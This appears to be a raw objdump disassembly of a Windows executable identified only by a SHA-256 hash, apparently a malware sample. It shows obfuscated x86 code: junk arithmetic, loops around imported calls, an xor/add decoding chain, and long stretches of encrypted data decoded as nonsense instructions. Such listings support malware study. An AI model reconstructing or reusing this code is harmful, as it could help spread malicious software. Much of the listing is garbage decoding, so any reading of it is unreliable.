
d142d79d7f442a87c4de7d9a410d86a2d9a8adf820afe19e16773f8c36912e77.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x20
  401006:	sbb    DWORD PTR ds:0x43460b,ecx
  40100c:	mov    eax,ds:0x414afe
  401011:	mov    eax,DWORD PTR [eax+0x198]
  401017:	mov    DWORD PTR [ebp-0x8],eax
  40101a:	add    eax,DWORD PTR ds:0x4344e3
  401020:	mov    eax,DWORD PTR [ebp+0x8]
  401023:	dec    DWORD PTR ds:0x434553
  401029:	mov    ecx,DWORD PTR [ebp-0x8]
  40102c:	sbb    DWORD PTR ds:0x4344f3,0x434547
  401036:	push   ebx
  401037:	push   esi
  401038:	sub    DWORD PTR ds:0x43460b,ebx
  40103e:	mov    esi,0x7510851
  401043:	mov    DWORD PTR ds:0x43453b,0x10
  40104d:	cmp    DWORD PTR ds:0x43453b,0x0
  401054:	je     0x4010ad
  40105a:	cmp    DWORD PTR ds:0x43453b,0x2
  401061:	jne    0x40107b
  401067:	push   DWORD PTR [ebp-0x1c]
  40106a:	push   DWORD PTR [ebp-0x18]
  40106d:	push   DWORD PTR [ebp-0x24]
  401070:	push   0x7fb5
  401075:	call   DWORD PTR ds:0x4130b4
  40107b:	cmp    DWORD PTR ds:0x43453b,0x3
  401082:	jne    0x401095
  401088:	mov    ebx,DWORD PTR ds:0x43453b
  40108e:	dec    ebx
  40108f:	mov    DWORD PTR ds:0x43453b,ebx
  401095:	mov    ebx,DWORD PTR ds:0x43453b
  40109b:	dec    ebx
  40109c:	mov    DWORD PTR ds:0x43453b,ebx
  4010a2:	jmp    0x40104d
  4010a7:	adc    DWORD PTR ds:0x43460f,ecx
  4010ad:	xor    eax,esi
  4010af:	push   edi
  4010b0:	mov    edi,DWORD PTR ds:0x43455f
  4010b6:	mov    ebx,DWORD PTR ds:0x434633
  4010bc:	sub    ebx,edi
  4010be:	imul   edi,DWORD PTR [edi+ebx*1]
  4010c2:	mov    edi,0x327299
  4010c7:	adc    DWORD PTR ds:0x434507,0x43458b
  4010d1:	add    eax,edi
  4010d3:	and    DWORD PTR ds:0x43458f,0x0
  4010dd:	jmp    0x4010ef
  4010e2:	mov    ebx,DWORD PTR ds:0x43458f
  4010e8:	inc    ebx
  4010e9:	mov    DWORD PTR ds:0x43458f,ebx
  4010ef:	cmp    DWORD PTR ds:0x43458f,0x1d
  4010f6:	jae    0x401312
  4010fc:	cmp    DWORD PTR ds:0x43458f,0xe
  401103:	jne    0x401119
  401109:	push   0x4344eb
  40110e:	push   0x43485b
  401113:	call   DWORD PTR ds:0x41332c
  401119:	cmp    DWORD PTR ds:0x43458f,0xd
  401120:	jne    0x401133
  401126:	mov    ebx,DWORD PTR ds:0x43458f
  40112c:	inc    ebx
  40112d:	mov    DWORD PTR ds:0x43458f,ebx
  401133:	jmp    0x4010e2
  401138:	or     DWORD PTR ds:0x4344eb,ebx
  40113e:	jmp    0x401312
  401143:	test   ah,ch
  401145:	push   edx
  401146:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401147:	jb     0x4010fd
  401149:	jl     0x401137
  40114b:	pop    eax
  40114c:	or     eax,0xf0571829
  401151:	jns    0x401121
  401153:	jle    0x4011d3
  401155:	jle    0x4011d5
  401157:	mov    ch,0x7f
  401159:	jle    0x4011d9
  40115b:	into   
  40115c:	xlat   BYTE PTR ds:[ebx]
  40115d:	cmp    ecx,edx
  40115f:	(bad)
  401162:	(bad)  
  401164:	pop    es
  401165:	add    BYTE PTR [ebx],al
  401167:	jns    0xf732079
  40116d:	int3   
  40116e:	and    al,0xc7
  401170:	sbb    al,0x1f
  401172:	inc    ebp
  401173:	fs or  al,0xb7
  401176:	(bad)  [esi]
  401178:	out    dx,eax
  401179:	mov    ecx,0x8e03d6db
  40117e:	es mov esi,0x114da2f0
  401184:	test   eax,0x661f46de
  401189:	call   0x985d1cfd
  40118e:	add    al,0xd6
  401190:	dec    esp
  401191:	stos   BYTE PTR es:[edi],al
  401192:	push   ebx
  401193:	sub    ebp,ebx
  401195:	sar    BYTE PTR [eax],0xa9
  401198:	mov    bh,BYTE PTR [ebx-0x3f]
  40119b:	stos   DWORD PTR es:[edi],eax
  40119c:	push   es
  40119d:	rcl    bl,0x8d
  4011a0:	test   esi,edx
  4011a2:	pushf  
  4011a3:	(bad)
  4011a6:	mov    esi,ebp
  4011a8:	dec    edi
  4011a9:	out    0xa6,al
  4011ab:	dec    ebp
  4011ac:	call   DWORD PTR [edi-0x254af85c]
  4011b2:	mov    ecx,0x5136e949
  4011b7:	and    esi,DWORD PTR [edx-0x47619116]
  4011bd:	jnp    0x4011dc
  4011bf:	ret    
  4011c0:	xchg   edx,eax
  4011c1:	sub    eax,0xc25eebd0
  4011c6:	loopne 0x40120c
  4011c8:	cld    
  4011c9:	jmp    0xd761:0x70cf3d92
  4011d0:	sub    al,0xc9
  4011d2:	add    ah,ch
  4011d4:	sbb    eax,0x331a65d
  4011d9:	outs   dx,DWORD PTR ds:[esi]
  4011da:	ins    DWORD PTR es:[edi],dx
  4011db:	add    al,0x14
  4011dd:	cmp    eax,0x34508ed9
  4011e2:	jno    0x401263
  4011e4:	(bad)
  4011e9:	or     ebx,DWORD PTR [ebx+0x51]
  4011ec:	(bad)  
  4011ee:	adc    eax,0x25e558d3
  4011f3:	jge    0x401193
  4011f5:	inc    esi
  4011f6:	dec    ebx
  4011f7:	aaa    
  4011f8:	adc    DWORD PTR [ebx],ebp
  4011fa:	ja     0x401231
  4011fc:	sbb    dl,bl
  4011fe:	ds dec edi
  401200:	hlt    
  401201:	leave  
  401202:	mov    al,ds:0x48fc30fb
  401207:	daa    
  401208:	(bad)  [ebx]
  40120a:	or     cl,al
  40120c:	xor    BYTE PTR [ebp-0x1b],dl
  40120f:	pushf  
  401210:	sub    bh,cl
  401212:	xor    eax,0x1a3e5e1a
  401217:	mov    dh,bh
  401219:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40121a:	mov    esi,DWORD PTR [ebx]
  40121c:	sbb    BYTE PTR [eax-0x69],bl
  40121f:	dec    eax
  401220:	fisttp QWORD PTR [eax+0x12]
  401223:	sbb    eax,0x9d3d4d0b
  401228:	sbb    ah,BYTE PTR [ebx]
  40122a:	pop    edi
  40122b:	or     al,0x82
  40122d:	mov    esp,esp
  40122f:	fscale 
  401231:	lods   al,BYTE PTR ds:[esi]
  401232:	fld    DWORD PTR [ebp+eax*2+0x18fc7963]
  401239:	call   0x179d:0xb616b2af
  401240:	repz aas 
  401242:	(bad)  
  401243:	dec    esi
  401244:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401245:	jo     0x4011fb
  401247:	jb     0x4012c4
  401249:	mov    dh,0x2f
  40124b:	into   
  40124c:	bound  edi,QWORD PTR [eax+0x2f]
  40124f:	fdiv   DWORD PTR [esi-0x38f03ce5]
  401255:	nop
  401256:	xchg   edi,eax
  401257:	mov    ds,WORD PTR [ebp+0x56]
  40125a:	xchg   esp,eax
  40125b:	jbe    0x401238
  40125d:	inc    BYTE PTR [ebp+0x29]
  401260:	jmp    0x73de4740
  401265:	popa   
  401266:	xchg   ecx,eax
  401267:	mov    ds:0x29b2ccde,eax
  40126c:	adc    ah,ch
  40126e:	mov    BYTE PTR [ebp-0x9cdcfb8],dl
  401274:	or     al,0xc7
  401276:	push   ebx
  401277:	adc    ebp,DWORD PTR [ebp-0x4ed2ee65]
  40127d:	mov    eax,0xdcde9f21
  401282:	sub    al,0xc8
  401284:	mov    edx,ebx
  401286:	out    dx,eax
  401287:	inc    eax
  401288:	outs   dx,DWORD PTR ds:[esi]
  401289:	cmp    al,0xba
  40128b:	mov    ebx,DWORD PTR [esi-0x41]
  40128e:	ins    BYTE PTR es:[edi],dx
  40128f:	push   ebp
  401290:	sti    
  401291:	sbb    ch,BYTE PTR [ecx+0x1e]
  401294:	pop    esi
  401295:	mov    ebp,0x3f3239fb
  40129a:	push   0x71
  40129c:	arpl   WORD PTR [edx+0x77],sp
  40129f:	popa   
  4012a0:	es (bad) 
  4012a2:	and    al,0x7c
  4012a4:	adc    BYTE PTR [esi+0x64],ch
  4012a7:	cmp    al,0x13
  4012a9:	and    al,0x87
  4012ab:	xor    ecx,DWORD PTR [ecx+0x64]
  4012ae:	dec    esp
  4012af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4012b0:	int    0x24
  4012b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4012b3:	dec    edi
  4012b4:	jg     0x401237
  4012b6:	jecxz  0x4012d6
  4012b8:	leave  
  4012b9:	inc    edx
  4012ba:	dec    edx
  4012bb:	pushf  
  4012bc:	mov    BYTE PTR [edx-0x16],bl
  4012bf:	and    esp,DWORD PTR [edx]
  4012c1:	inc    ecx
  4012c2:	int3   
  4012c3:	pop    es
  4012c4:	pop    DWORD PTR [edx]
  4012c6:	jno    0x4012a7
  4012c8:	dec    eax
  4012c9:	jns    0x401324
  4012cb:	pop    eax
  4012cc:	or     ah,0xb2
  4012cf:	inc    esp
  4012d0:	mov    ah,0xb3
  4012d2:	dec    esi
  4012d3:	dec    ecx
  4012d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4012d5:	nop
  4012d6:	mov    ds:0x78bc6599,al
  4012db:	mov    edx,0x30b7c4b6
  4012e0:	dec    esp
  4012e1:	call   0x4fd:0xc77c06a4
  4012e8:	cmp    eax,0xcb2b596f
  4012ed:	and    al,0xf4
  4012ef:	(bad)  
  4012f0:	in     eax,0x63
  4012f2:	sub    eax,0x85468452
  4012f7:	cmc    
  4012f8:	outs   dx,BYTE PTR ds:[esi]
  4012f9:	mov    al,0x36
  4012fb:	adc    esi,eax
  4012fd:	out    0xd8,al
  4012ff:	sar    DWORD PTR [eax],1
  401301:	in     al,0x53
  401303:	add    DWORD PTR [edx],edi
  401305:	mov    ds:0x409c2b08,eax
  40130a:	(bad)  
  40130b:	in     eax,dx
  40130c:	sub    BYTE PTR [eax],ch
  40130e:	adc    ebp,DWORD PTR [esi]
  401310:	or     al,0x5d
  401312:	mov    DWORD PTR [ecx],eax
  401314:	adc    ecx,0x1222
  40131a:	lea    eax,[ebp-0x4]
  40131d:	xor    DWORD PTR ds:0x43457f,0x53dc
  401327:	mov    DWORD PTR [ebp-0x10],eax
  40132a:	adc    DWORD PTR ds:0x43453f,edi
  401330:	mov    eax,DWORD PTR [ebp+0x8]
  401333:	or     DWORD PTR ds:0x4344ef,0x4344e3
  40133d:	mov    ecx,DWORD PTR [ebp-0x10]
  401340:	xor    DWORD PTR ds:0x4344f3,ebx
  401346:	xor    eax,esi
  401348:	neg    ebx
  40134a:	add    eax,edi
  40134c:	mov    DWORD PTR [ecx],eax
  40134e:	mov    DWORD PTR [ebp-0x14],0xf89c8536
  401355:	lea    eax,[ebp-0x14]
  401358:	sbb    ecx,ecx
  40135a:	mov    DWORD PTR [ebp-0x20],eax
  40135d:	mov    eax,DWORD PTR [ebp-0x14]
  401360:	mov    ecx,DWORD PTR [ebp-0x20]
  401363:	and    DWORD PTR ds:0x4345c3,0x0
  40136d:	xor    ebx,ebx
  40136f:	add    ebx,DWORD PTR ds:0x4345c3
  401375:	inc    ebx
  401376:	mov    DWORD PTR ds:0x4345c3,ebx
  40137c:	cmp    DWORD PTR ds:0x4345c3,0x9
  401383:	jne    0x401394
  401389:	push   0x3702
  40138e:	call   DWORD PTR ds:0x4130b8
  401394:	cmp    DWORD PTR ds:0x4345c3,0x8
  40139b:	jne    0x4013ae
  4013a1:	mov    ebx,DWORD PTR ds:0x4345c3
  4013a7:	inc    ebx
  4013a8:	mov    DWORD PTR ds:0x4345c3,ebx
  4013ae:	cmp    DWORD PTR ds:0x4345c3,0x1c
  4013b5:	jb     0x40136d
  4013bb:	add    DWORD PTR ds:0x43453f,ecx
  4013c1:	xor    eax,esi
  4013c3:	add    eax,edi
  4013c5:	mov    DWORD PTR [ecx],eax
  4013c7:	dec    DWORD PTR ds:0x43458b
  4013cd:	mov    eax,ds:0x414bd2
  4013d2:	mov    ebx,0x8e12febf
  4013d7:	mov    DWORD PTR [ebp-0xc],ebx
  4013da:	sbb    DWORD PTR ds:0x4344ef,0x43453f
  4013e4:	mov    eax,DWORD PTR [eax]
  4013e6:	adc    DWORD PTR ds:0x4344eb,0x4345f7
  4013f0:	mov    cx,WORD PTR [ebp-0x4]
  4013f4:	xor    DWORD PTR ds:0x434503,0x1391
  4013fe:	movzx  ecx,cx
  401401:	add    ecx,DWORD PTR [eax]
  401403:	mov    DWORD PTR [ebp-0x18],ecx
  401406:	jmp    0x4015da
  40140b:	fisub  DWORD PTR [esi]
  40140d:	add    BYTE PTR [ecx],0x42
  401410:	lods   eax,DWORD PTR ds:[esi]
  401411:	gs in  eax,dx
  401413:	aam    0x1e
  401415:	dec    edx
  401416:	xchg   DWORD PTR [ecx-0x6b],ebp
  401419:	test   al,0xfa
  40141b:	mov    ch,0x7f
  40141d:	jle    0x40149d
  40141f:	mov    ch,0x7f
  401421:	jle    0x4014a1
  401423:	cmp    ch,BYTE PTR [eax]
  401425:	fmul   DWORD PTR [eax+0x7cfbf2ce]
  40142b:	sub    dh,0x61
  40142e:	div    DWORD PTR [ebx-0x26]
  401431:	inc    ecx
  401432:	fst    DWORD PTR [ecx]
  401434:	mov    WORD PTR [edx-0x1734807a],cs
  40143a:	mov    ds:0x5e1e77aa,eax
  40143f:	arpl   bx,bx
  401441:	xchg   edi,eax
  401442:	pop    edx
  401443:	or     DWORD PTR [edi+eax*4],edi
  401446:	pop    eax
  401447:	repnz sub ch,bl
  40144a:	stos   BYTE PTR es:[edi],al
  40144b:	jle    0x40142d
  40144d:	xchg   ebp,eax
  40144e:	adc    ebx,esi
  401450:	push   DWORD PTR [edi+ecx*4]
  401453:	mov    WORD PTR [esi-0x788c51a2],?
  401459:	aaa    
  40145a:	mov    eax,0xe3b0ad98
  40145f:	cdq    
  401460:	pop    ebx
  401461:	xchg   ebx,eax
  401463:	mov    gs,WORD PTR [eax-0x71b04a66]
  401469:	mov    ebx,0x814ace31
  40146e:	add    eax,0x1bdc0e7e
  401473:	not    DWORD PTR [ecx+0x9dffa57]
  401479:	cld    
  40147a:	mov    ds:0x435a6cf4,al
  40147f:	jp     0x401450
  401481:	sti    
  401482:	dec    edx
  401483:	addr16 pop ds
  401485:	test   BYTE PTR [ecx-0x1cc21231],bl
  40148b:	mov    ecx,0xec03ed4
  401490:	gs mov ebp,0xe64b744
  401496:	mov    esp,0x48a1b966
  40149b:	mov    ecx,0x8ae3ec4f
  4014a0:	or     DWORD PTR [ecx-0x17],0x531af60a
  4014a7:	mov    ss,esi
  4014a9:	mov    esi,0x7614e7a2
  4014ae:	dec    esi
  4014af:	adc    DWORD PTR [edx+edx*4-0x454e775d],edi
  4014b6:	ret    0xa3f6
  4014b9:	dec    ebx
  4014ba:	jecxz  0x401530
  4014bc:	or     BYTE PTR [edi],0x31
  4014bf:	mov    cl,0xfd
  4014c1:	pusha  
  4014c2:	push   esi
  4014c3:	jo     0x4014ad
  4014c5:	jb     0x401476
  4014c7:	mov    BYTE PTR [esi-0x45],0x83
  4014cb:	sub    BYTE PTR gs:[edx+0x38],cl
  4014cf:	fdivr  QWORD PTR [ecx+0x40]
  4014d2:	nop
  4014d3:	int    0x95
  4014d5:	jns    0x40150f
  4014d7:	push   0x53
  4014d9:	mov    ah,0x17
  4014db:	outs   dx,DWORD PTR ds:[esi]
  4014dc:	ret    0xd37f
  4014df:	jecxz  0x4014a5
  4014e1:	jae    0x4014c5
  4014e3:	sub    BYTE PTR [ecx-0x779b6780],dh
  4014e9:	int    0x16
  4014eb:	icebp  
  4014ec:	or     dh,bh
  4014ee:	and    ah,ch
  4014f0:	sbb    eax,DWORD PTR [ebx-0x5eb79ee4]
  4014f6:	shl    BYTE PTR [ebx*1-0x556e8b0],cl
  4014fd:	fimul  WORD PTR [ebx-0x7]
  401500:	loop   0x401534
  401502:	sbb    DWORD PTR [edi+0x238325e0],ebx
  401508:	inc    ecx
  401509:	sbb    esi,edi
  40150b:	push   0x7e41c83f
  401510:	push   es
  401511:	jae    0x4014f6
  401513:	popa   
  401514:	mov    DWORD PTR [esi],esp
  401516:	adc    eax,0xaba333c1
  40151b:	cwde   
  40151c:	or     ecx,edx
  40151e:	cli    
  40151f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401520:	repz adc BYTE PTR [eax],bh
  401523:	pop    esi
  401524:	mov    dh,0x3
  401526:	push   ds
  401527:	daa    
  401528:	xchg   bl,ah
  40152a:	adc    al,0x8c
  40152c:	scas   al,BYTE PTR es:[edi]
  40152d:	adc    eax,0xe2aefd
  401532:	cwde   
  401533:	aam    0x68
  401535:	mov    esi,0x7a35bc56
  40153a:	mov    ebp,es
  40153c:	mov    ah,0x40
  40153e:	adc    ecx,ebx
  401540:	pop    edx
  401541:	jnp    0x401572
  401543:	or     BYTE PTR [ecx],ch
  401545:	scas   eax,DWORD PTR es:[edi]
  401546:	stos   DWORD PTR es:[edi],eax
  401547:	inc    ebx
  401548:	daa    
  401549:	pop    ecx
  40154a:	retf   0x422a
  40154d:	imul   esi,DWORD PTR [ebp-0x1f],0xbb9b5504
  401554:	mov    cl,0xae
  401556:	mov    ss,WORD PTR [esi+0x390c1c92]
  40155c:	mov    ch,0xd0
  40155e:	popf   
  40155f:	mov    eax,ds:0x24fe994f
  401564:	popa   
  401565:	js     0x401594
  401567:	(bad)  
  401568:	adc    al,0xdb
  40156a:	nop
  40156b:	or     dh,BYTE PTR [eax+0x20]
  40156e:	icebp  
  40156f:	add    eax,0xbac27f36
  401574:	sub    BYTE PTR [ecx-0x24b69668],ch
  40157a:	xor    DWORD PTR [ecx],ebx
  40157c:	out    0x51,eax
  40157e:	pop    ebp
  40157f:	xor    al,0x6d
  401581:	adc    DWORD PTR [ecx+ecx*4+0x73d731a3],ebp
  401588:	mov    ah,0x6a
  40158a:	enter  0x521c,0xca
  40158e:	sbb    BYTE PTR [eax],ch
  401590:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401591:	lods   al,BYTE PTR ds:[esi]
  401592:	cwde   
  401593:	popf   
  401594:	push   ebp
  401595:	fstp   TBYTE PTR [eax+eiz*4+0x68]
  401599:	repnz mov gs,esi
  40159c:	push   ds
  40159d:	push   edi
  40159e:	or     BYTE PTR [ebp+0x15],0xc4
  4015a2:	je     0x401618
  4015a4:	das    
  4015a5:	fldcw  WORD PTR ds:0x78187f7a
  4015ab:	or     DWORD PTR [edi],esi
  4015ad:	sahf   
  4015ae:	xchg   edi,eax
  4015af:	popf   
  4015b0:	data16 sbb al,0x57
  4015b3:	daa    
  4015b4:	pop    edx
  4015b5:	adc    DWORD PTR [ecx],ebx
  4015b7:	sti    
  4015b8:	rol    DWORD PTR [ebx-0x6531ff1],1
  4015be:	(bad)  
  4015c0:	cmp    BYTE PTR [edi-0x7f8edae5],bl
  4015c6:	fst    st(3)
  4015c8:	jnp    0x401589
  4015ca:	pop    eax
  4015cb:	xor    DWORD PTR [esi+eiz*8-0x37f4fe55],0xffffffbf
  4015d3:	scas   eax,DWORD PTR es:[edi]
  4015d4:	xor    ebp,ebx
  4015d6:	pop    edx
  4015d7:	cmp    al,0xce
  4015d9:	call   0x8b485b69
  4015de:	or     eax,0x43460f
  4015e3:	and    DWORD PTR ds:0x4345bf,ecx
  4015e9:	mov    ecx,DWORD PTR [ebp-0x8]
  4015ec:	xor    eax,esi
  4015ee:	add    DWORD PTR ds:0x4344e3,0x598
  4015f8:	add    eax,edi
  4015fa:	mov    DWORD PTR ds:0x434543,0x7c6b
  401604:	cmp    DWORD PTR [ecx],eax
  401606:	mov    DWORD PTR ds:0x434593,0x6dd9
  401610:	jne    0x40227a
  401616:	and    DWORD PTR ds:0x434583,0x0
  401620:	mov    ecx,DWORD PTR ds:0x434583
  401626:	inc    ecx
  401627:	mov    DWORD PTR ds:0x434583,ecx
  40162d:	cmp    DWORD PTR ds:0x434583,0x4
  401634:	jne    0x401645
  40163a:	push   0x2f81
  40163f:	call   DWORD PTR ds:0x413270
  401645:	cmp    DWORD PTR ds:0x434583,0x3
  40164c:	jne    0x40165f
  401652:	mov    ecx,DWORD PTR ds:0x434583
  401658:	inc    ecx
  401659:	mov    DWORD PTR ds:0x434583,ecx
  40165f:	cmp    DWORD PTR ds:0x434583,0x14
  401666:	jb     0x401620
  40166c:	xor    ecx,ecx
  40166e:	or     ecx,DWORD PTR ds:0x434523
  401674:	mov    eax,ds:0x43456b
  401679:	sub    eax,ecx
  40167b:	and    ecx,DWORD PTR [ecx+eax*1]
  40167e:	mov    eax,DWORD PTR [ebp+0x8]
  401681:	mov    ecx,DWORD PTR [ebp-0x18]
  401684:	add    DWORD PTR ds:0x4345cb,0x4345f7
  40168e:	xor    eax,esi
  401690:	or     DWORD PTR ds:0x4344eb,0x526e
  40169a:	add    eax,edi
  40169c:	mov    DWORD PTR ds:0x4344ef,0x6068
  4016a6:	cmp    DWORD PTR [ecx],eax
  4016a8:	jmp    0x40187c
  4016ad:	cmp    dh,BYTE PTR [esi]
  4016af:	sub    eax,0x6255fdb9
  4016b4:	mov    ebp,0xf85a51d5
  4016b9:	ss dec ecx
  4016bb:	call   0x7eba0331
  4016c0:	jle    0x401677
  4016c2:	jg     0x401742
  4016c4:	jle    0x4016da
  4016c6:	in     eax,dx
  4016c7:	xchg   DWORD PTR [esi],ebx
  4016c9:	(bad)  
  4016ca:	arpl   WORD PTR [edx-0x66757336],cx
  4016d0:	jb     0x40172d
  4016d2:	mov    eax,0xc9e525c0
  4016d7:	lds    esi,FWORD PTR [edi]
  4016d9:	xchg   esi,eax
  4016da:	adc    ebp,DWORD PTR [ebx]
  4016dc:	dec    esi
  4016dd:	cmc    
  4016de:	xor    ebp,ebp
  4016e0:	mov    ah,0xf4
  4016e2:	mov    ?,WORD PTR [esi-0x19]
  4016e5:	cmc    
  4016e6:	dec    esp
  4016e7:	dec    esi
  4016e8:	test   DWORD PTR [edi],ebx
  4016ea:	dec    DWORD PTR [eax-0x123da363]
  4016f0:	mov    ch,0xd6
  4016f2:	mov    DWORD PTR [ecx-0x708f145d],esp
  4016f8:	jmp    0x401769
  4016fa:	inc    ecx
  4016fb:	pop    esp
  4016fc:	icebp  
  4016fd:	xchg   edx,eax
  4016fe:	mov    ds:0x18441dab,eax
  401703:	mov    dh,0xea
  401705:	and    DWORD PTR [edi+0x22],0xd2ab06e8
  40170c:	adc    cl,BYTE PTR [esp+edx*2-0x65]
  401710:	push   DWORD PTR [ebp+0x60]
  401713:	pushf  
  401714:	xor    DWORD PTR [eax-0x30],esp
  401717:	pop    ecx
  401718:	neg    esp
  40171a:	xchg   DWORD PTR [edi+0x1840422],ecx
  401720:	jge    0x401743
  401722:	push   ebp
  401723:	jg     0x40173e
  401725:	jmp    0x2c6:0x54c1355e
  40172c:	les    ebx,FWORD PTR [ebp+edi*8-0xedfd48c]
  401733:	cli    
  401734:	mov    cl,0x20
  401736:	popa   
  401737:	pop    ds
  401738:	xor    DWORD PTR [esi-0x470dfb01],edi
  40173e:	je     0x401716
  401740:	iret   
  401741:	rcr    DWORD PTR [esi],0x5
  401744:	icebp  
  401745:	ret    
  401746:	outs   dx,DWORD PTR ds:[esi]
  401747:	jo     0x401720
  401749:	test   al,0xce
  40174b:	add    al,0xf3
  40174d:	test   edi,esi
  40174f:	js     0x4016fc
  401751:	andnps xmm2,XMMWORD PTR [ecx+0x38641d3f]
  401758:	in     al,dx
  401759:	push   ss
  40175a:	push   ebp
  40175b:	inc    ecx
  40175c:	es or  eax,0x9a524aa4
  401762:	xchg   BYTE PTR [edi+0x7c],ah
  401765:	dec    esp
  401766:	jecxz  0x401707
  401768:	sub    eax,0xb55b7838
  40176d:	scas   al,BYTE PTR es:[edi]
  40176e:	pop    ebx
  40176f:	cld    
  401770:	sbb    DWORD PTR [ecx+0x2f],eax
  401773:	jecxz  0x40177f
  401775:	pop    esp
  401776:	add    BYTE PTR [edx],dl
  401778:	xchg   ebp,eax
  401779:	jo     0x40178d
  40177b:	add    BYTE PTR [ebx],dl
  40177d:	xchg   ebx,eax
  40177e:	sub    ebp,ebx
  401780:	or     DWORD PTR [ebp-0x7b5312c7],0x23
  401787:	add    ebx,ebp
  401789:	fld    QWORD PTR [edi+0x190cb14b]
  40178f:	sbb    eax,0xab9d5bfb
  401794:	fmul   st,st(4)
  401796:	int    0xa7
  401798:	xor    eax,DWORD PTR ds:0x54667802
  40179e:	mov    ecx,0x6f10fb3b
  4017a3:	lods   al,BYTE PTR ds:[esi]
  4017a4:	call   0xfc04:0xb4481233
  4017ab:	mov    edx,0xc0140d60
  4017b0:	inc    eax
  4017b1:	sub    cl,ah
  4017b3:	mov    DWORD PTR [edx+0x4d3d5515],edx
  4017b9:	sub    eax,0x43367ded
  4017be:	mov    edx,0x46fd0354
  4017c3:	inc    ebx
  4017c4:	sahf   
  4017c5:	add    eax,0x3a6f830f
  4017ca:	mov    bh,0x8d
  4017cc:	cmp    al,0xe4
  4017ce:	add    dh,ah
  4017d0:	mov    ah,0x46
  4017d2:	xchg   ebp,eax
  4017d3:	sub    dl,BYTE PTR [edx-0x5f]
  4017d6:	pop    ebp
  4017d7:	lods   eax,DWORD PTR ds:[esi]
  4017d8:	in     al,dx
  4017d9:	mov    bl,0xff
  4017db:	je     0x401784
  4017dd:	(bad)  
  4017de:	jle    0x87c94a8e
  4017e4:	fimul  DWORD PTR [ecx+0x2347f3a5]
  4017ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4017eb:	std    
  4017ec:	sbb    eax,0x5c018d3c
  4017f1:	inc    eax
  4017f2:	push   ecx
  4017f3:	dec    ebp
  4017f4:	addr16 pushf 
  4017f6:	int    0xb7
  4017f8:	cmp    DWORD PTR [edx+0x5fc9ec93],0x23f9bc13
  401802:	loope  0x40180c
  401804:	lock aam 0x55
  401807:	je     0x401864
  401809:	pop    edx
  40180a:	xor    bh,BYTE PTR [ecx-0xe]
  40180d:	xchg   esi,eax
  40180e:	xchg   ebp,ebx
  401810:	mov    ebx,gs
  401812:	mov    cl,BYTE PTR [eax]
  401814:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401815:	pop    ecx
  401816:	iret   
  401817:	fdivr  DWORD PTR [eax+0x71617509]
  40181d:	push   edi
  40181e:	cmp    BYTE PTR [esi+edx*4],cl
  401821:	ret    0xb86f
  401824:	mov    edx,0x25ca7482
  401829:	into   
  40182a:	push   ss
  40182b:	mov    cl,0xb3
  40182d:	add    cl,BYTE PTR [ecx-0x27]
  401830:	mov    ebx,0xe6f044c3
  401835:	fdivr  QWORD PTR [edi-0x512fe5e2]
  40183b:	adc    ecx,0x60ffe51
  401841:	imul   edi
  401843:	inc    edi
  401844:	(bad)
  401847:	fmulp  st(2),st
  401849:	cmp    BYTE PTR [esi+0x55],ah
  40184c:	jg     0x4017e8
  40184e:	pop    eax
  40184f:	pop    ss
  401850:	sbb    BYTE PTR [esi-0x7d],ah
  401853:	and    DWORD PTR [ebp-0x26e9898b],edx
  401859:	pushf  
  40185a:	sti    
  40185b:	xchg   esi,eax
  40185c:	(bad)  
  40185d:	jmp    0x4018d9
  40185f:	or     ch,BYTE PTR [edx+0x274527e6]
  401865:	ins    BYTE PTR es:[edi],dx
  401866:	ins    BYTE PTR es:[edi],dx
  401867:	cmp    eax,0xbaa706e3
  40186c:	mov    al,ds:0xc3ada158
  401871:	mov    DWORD PTR [eax-0x3e],esp
  401874:	jae    0x4018c8
  401876:	mov    bl,0xa3
  401878:	call   0xfaf01ea
  40187d:	test   DWORD PTR [edi],esp
  40187f:	add    al,0x0
  401881:	add    BYTE PTR [ebx+0x4346030d],cl
  401887:	add    BYTE PTR [ecx],cl
  401889:	or     eax,0x4344e3
  40188e:	jmp    0x401a62
  401893:	or     esi,DWORD PTR [edi+eiz*2-0x2a]
  401897:	popa   
  401898:	(bad)  [ebx+0x728b6c7d]
  40189e:	sbb    bl,ah
  4018a0:	dec    edi
  4018a1:	push   edi
  4018a2:	pop    edi
  4018a3:	sbb    edi,DWORD PTR [ebx+0x7e]
  4018a6:	jle    0x40185d
  4018a8:	jg     0x401928
  4018aa:	jle    0x40187c
  4018ac:	nop
  4018ad:	xor    eax,ebp
  4018af:	add    dh,bh
  4018b1:	test   ebx,edi
  4018b3:	out    dx,eax
  4018b4:	push   es
  4018b5:	mov    esi,0x597501ff
  4018ba:	mov    ?,WORD PTR [eax+edi*1]
  4018bd:	sbb    eax,ebp
  4018bf:	shl    BYTE PTR [edx+eax*8-0x15],0xbf
  4018c4:	dec    edx
  4018c5:	jl     0x401937
  4018c7:	mov    ah,0x6c
  4018c9:	sub    BYTE PTR [ecx+0x76],0xd6
  4018cd:	cmp    eax,0x908b7cd7
  4018d2:	in     al,0x31
  4018d4:	add    esi,esi
  4018d6:	dec    ecx
  4018d7:	test   al,0x8d
  4018d9:	mov    ah,0xe1
  4018db:	jae    0x4018a7
  4018dd:	mov    esp,0x75e0c4c7
  4018e2:	mov    BYTE PTR [esi],dl
  4018e4:	aas    
  4018e5:	pop    esi
  4018e6:	int    0x8e
  4018e8:	cwde   
  4018e9:	mov    esp,0x40367623
  4018ee:	stos   DWORD PTR es:[edi],eax
  4018ef:	push   ebx
  4018f0:	xor    eax,0xe6db8640
  4018f5:	pushf  
  4018f6:	cli    
  4018f7:	ins    DWORD PTR es:[edi],dx
  4018f8:	dec    ebp
  4018f9:	inc    ebp
  4018fa:	pusha  
  4018fb:	aad    0x15
  4018fd:	and    bl,bh
  4018ff:	popa   
  401900:	aam    0x82
  401902:	loopne 0x4018dd
